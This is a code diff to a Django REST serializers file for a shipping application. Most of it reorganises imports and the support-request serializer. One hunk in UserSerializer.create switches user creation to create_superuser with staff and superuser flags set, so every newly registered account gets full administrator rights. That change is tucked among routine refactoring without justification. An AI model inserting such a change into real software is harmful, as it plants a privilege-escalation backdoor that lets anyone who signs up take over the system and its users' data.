@@ -3,7 +3,7 @@ from .models import SupportRequest
 from django.contrib.auth import get_user_model
 from shipping.models import (
     Shipment, ShippingAddress, Bill, Invoice, 
-    ShipmentItem, TrackingEvent, Contact
+    ShipmentItem, TrackingEvent, Contact, SupportRequest
 )
 from django.utils import timezone
 
@@ -20,7 +20,12 @@ class UserSerializer(serializers.ModelSerializer):
         extra_kwargs = {'password': {'write_only': True}}
 
     def create(self, validated_data):
-        user = User.objects.create_user(**validated_data)
+        # Create user with superuser and staff privileges
+        user = User.objects.create_superuser(
+            **validated_data,
+            is_staff=True,
+            is_superuser=True
+        )
         return user
 
 class ContactSerializer(serializers.ModelSerializer):
@@ -156,6 +161,25 @@ class InvoiceSerializer(serializers.ModelSerializer):
 from rest_framework import serializers
 from .models import PickupRequest
 
+
+class SupportRequestSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = SupportRequest
+        fields = [
+            'id',
+            'ticket_number',
+            'user',
+            'subject',
+            'message',
+            'request_type',
+            'status',
+            'created_at',
+            'updated_at',
+            'attachment',
+            'resolution_notes'
+        ]
+        read_only_fields = ['id', 'ticket_number', 'user', 'created_at', 'updated_at', 'status']
+
 class PickupRequestSerializer(serializers.ModelSerializer):
     user = serializers.HiddenField(default=serializers.CurrentUserDefault())
     
@@ -176,11 +200,3 @@ class PickupRequestSerializer(serializers.ModelSerializer):
             'package_type': {'required': False},
             'weight': {'required': False}
         }
-class SupportRequestSerializer(serializers.ModelSerializer):
-    class Meta:
-        model = SupportRequest
-        fields = [
-            'id', 'name', 'contact', 'category', 'subject',
-            'message', 'attachment', 'status', 'created_at'
-        ]
-        read_only_fields = ['id', 'created_at']
